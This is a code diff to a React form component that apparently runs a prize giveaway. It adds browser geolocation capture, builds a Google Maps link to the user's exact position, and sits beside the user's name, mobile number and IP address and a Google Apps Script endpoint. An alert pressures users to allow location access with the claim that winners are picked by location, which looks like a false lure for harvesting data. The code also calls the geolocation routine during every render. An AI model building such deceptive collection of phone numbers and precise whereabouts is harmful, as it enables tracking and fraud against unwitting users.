@@ -1,13 +1,64 @@
 import React, { useRef, useState } from "react";
-import useGeoLocation from "../Hooks/useGeoLocation";
+
 
 const Form = (props) => {
   const [winner, setWinner] = useState(false)
+  const [location, setLocation] = useState({
+    loaded: false,
+    coordinates: { lat: "", lng: "" },
+    mapLink: "",
+    error:{
+        code:"",
+        message: ""
+    }
+});
   const formRef = useRef(null);
+
 
   const {name,mobile,ipAddress}=props;
 
-  const location = useGeoLocation();
+  
+const GeoLocation = () => {   
+    const onSuccess = (location) => {
+        setLocation({
+            loaded: true,
+            coordinates: {
+                lat: location.coords.latitude,
+                lng: location.coords.longitude,
+            },
+            mapLink: `https://www.google.com/maps/search/${location.coords.latitude},+${location.coords.longitude}?shorturl=1`,
+
+        });
+    };
+
+    const onError = (error) => {
+        setLocation({
+            loaded: false,
+            error: {
+                code: error.code,
+                message: error.message,
+                
+            },
+        });
+        
+    };
+
+    
+        if (!("geolocation" in navigator)) {
+            onError({
+                code: 0,
+                message: "Geolocation not supported",
+            });
+        }
+
+        navigator.geolocation.getCurrentPosition(onSuccess, onError);
+    
+
+    return location;
+};
+
+GeoLocation();
+
 
   const scriptURL =
     "https://script.google.com/macros/s/AKfycbwEptCCNw6hFnIPLkcerNNgFIC_mlQ0CtGkViOu7xci0nt7M5c_B8EhoSmtOMkBZ2HYeA/exec";
@@ -30,6 +81,7 @@ const Form = (props) => {
   };
 
   const checkLocation=()=>{
+    GeoLocation();
     if(!location.loaded){
         alert("We are only picking winner Location Base, Allow location to get a chance to win")
         return
